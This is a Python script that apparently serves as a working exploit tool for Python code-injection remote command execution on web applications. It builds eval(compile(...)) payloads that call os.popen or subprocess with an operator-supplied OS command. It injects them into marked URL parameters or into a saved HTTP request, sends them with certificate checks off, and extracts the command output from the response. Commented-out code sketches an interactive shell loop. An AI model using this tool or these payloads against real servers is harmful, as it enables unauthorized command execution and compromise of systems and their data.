#!/bin/python3

# From http://stackoverflow.com/questions/2115410/does-python-have-a-module-for-parsing-http-requests-and-responses
from http.server import BaseHTTPRequestHandler
from io import BytesIO
from typing import Union

import argparse
import os
import re
import requests
import urllib.error
import urllib.parse
import urllib.request

CODES = [
    '''eval(compile("""for x in range(1):\\n print("-"*99)\\n print("Successful")""",'<string>','single'))''',
    '''eval(compile("""for x in range(1):\\n import os\\n print("-"*99)\\n os.popen(r'{}').read()""",'<string>','single'))''',
    '''eval(compile("""for x in range(1):\\n import os,subprocess\\n print("-"*99)\\n subprocess.Popen('{}', shell=True,stdout=subprocess.PIPE).stdout.read()""",'<string>','single'))'''
]


class HTTPRequest(BaseHTTPRequestHandler):
    def __init__(self, request_text):
        self.rfile = BytesIO(request_text)
        self.raw_requestline = self.rfile.readline()
        self.error_code = self.error_message = None
        self.parse_request()


class Request():
    def __init__(self, uri: str, method: str = 'GET', headers: dict = None, data: Union[dict, str, bytes] = None):
        self.uri = uri
        self.method = method
        self.headers = headers
        self.data = data

    @classmethod
    def from_file(cls, path: str, cmd: str = None, querys=None, timeout: int = 3):
        if not os.path.isfile(path):
            return None
        devil_code = urllib.parse.quote(CODES[1].format(cmd))
        with open(path, 'r') as _f:
            content = _f.read()
        o_request = HTTPRequest(content.encode())
        uri = 'https://{}{}'.format(o_request.headers['host'], o_request.path)
        try:
            respone = requests.request(o_request.command, uri, headers=o_request.headers, data=o_request.rfile.read(),
                                       timeout=timeout)
        except requests.RequestException as e:
            respone = None
        if respone and 500 > respone.status_code >= 200:
            scheme = 'https'
        else:
            scheme = 'http'
        accept_line = re.search('Accept:.*', content)
        if querys:
            for q in querys:
                content = re.sub(r'%s=[^=&?#/\\]+' % q, '%s=*' % q, content)
        content = re.sub(r'\*', devil_code, content)
        if accept_line:
            content = re.sub('Accept:.*', accept_line.group(0), content)
        o_request = HTTPRequest(content.encode())
        return cls('{}://{}{}'.format(scheme, o_request.headers['host'], o_request.path), o_request.command,
                   o_request.headers, o_request.rfile.read())

    def send(self) -> Union[Exception, requests.Response]:
        try:
            if not self.method:
                if self.data:
                    self.method = 'POST'
            response = requests.request(self.method, self.uri, headers=self.headers, data=self.data, verify=False)
        except requests.RequestException as e:
            return e
        return response


def gen_url(uri: str, cmd: str, querys: list = None) -> str:
    if querys:
        for q in querys:
            uri = re.sub(r'%s=[^=&?#/\\]+' % q, '%s=*' % q, uri)
    devil_code = CODES[1].format(cmd)
    devil_code = urllib.parse.quote(devil_code)
    return uri.replace('*', devil_code)


def how_about_it(request: Request):
    res = request.send()
    if isinstance(res, requests.RequestException):
        print('[-] Error:', res)
        return

    r_text = re.search(r'[-]{99,}\n(.*)', res.text)
    if r_text:
        result = r_text.group(1).strip()
        print('[+] Result:', result)
        return result
    else:
        print('[-] Could not found output')
        print('[-] Status code:', res.status_code)
    return


def send_request(uri: str, method: str = 'GET', headers=None, data=None) -> Union[None, str]:
    try:
        if not method:
            if data:
                method = 'POST'
        response = requests.request(method, uri, headers=headers, data=data, verify=False)
    except Exception as e:
        print('[-] Error:', e)
        return

    r_text = re.search(r'[-]{99,}\n(.*)', response.text)
    if r_text:
        result = r_text.group(1).strip()
        print('[+] Result:', result)
        return result
    else:
        print('[-] Could not found output')
        print('[-] Status code:', response.status_code)
    return


if __name__ == '__main__':
    pass
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='Specify the URL. Use * or -p to set injection point')
    parser.add_argument('-c', '--cmd', help='Enter the OS command')
    parser.add_argument('-p', '--params', nargs='*', help='Specify injection parameter')
    parser.add_argument('-r', '--request-file', help='Specify request file. Works with * or -p')

    args = parser.parse_args()

    r = None
    if args.request_file:
        r = Request.from_file(args.request_file, args.cmd, args.params)
        if not r:
            print('[!] {} is not file.'.format(args.request_file))
            exit(0)
    elif args.url:
        r = Request(gen_url(args.url, args.cmd, args.params))
    else:
        print('[!] One modes "-r" or "-u" must be specified')
        exit(0)
    how_about_it(r)
    # (options, args) = parser.parse_args()
    # # cmd = options.command
    # # uri = options.url
    # request = options.request
    # # parameter = options.parameter
    # # print options.parameter
    # # print
    # if (options.url) and (options.request):
    #     print("Either enter a URL or a request file, but not both.")
    #     exit()
    #
    # if (options.url) and (options.parameter):
    #     # print("URL entered by user: " + options.url)
    #     parsed_url = gen_url(options.cmd, options.url, options.parameter)
    #     send_request(parsed_url)
    #
    #     if (options.interactive):
    #         while True:
    #             new_cmd = input("Command:")
    #             uri = gen_url(new_cmd, options.url, options.parameter)
    #             send_request(uri, new_cmd)
    #
    # if (options.url) and not (options.parameter):
    #     # print("URL entered by user: " + options.url)
    #     parsed_url = gen_url(options.cmd, options.url, options.parameter)
    #     send_request(parsed_url, options.cmd)
    #     if (options.interactive):
    #         while True:
    #             new_cmd = input("Command:")
    #             uri = gen_url(new_cmd, options.url, options.parameter)
    #             send_request(uri, new_cmd)
    #
    # if (options.request):
    #     parsed_url, headers, data = parse_request(options.cmd, options.request, options.parameter)
    #     send_request(parsed_url, headers=headers, data=data)
    #     if (options.interactive):
    #         while True:
    #             new_cmd = input("Command:")
    #             parsed_url, headers, data = parse_request(new_cmd, options.request, options.parameter)
    #             send_request(parsed_url, headers=headers, data=data)
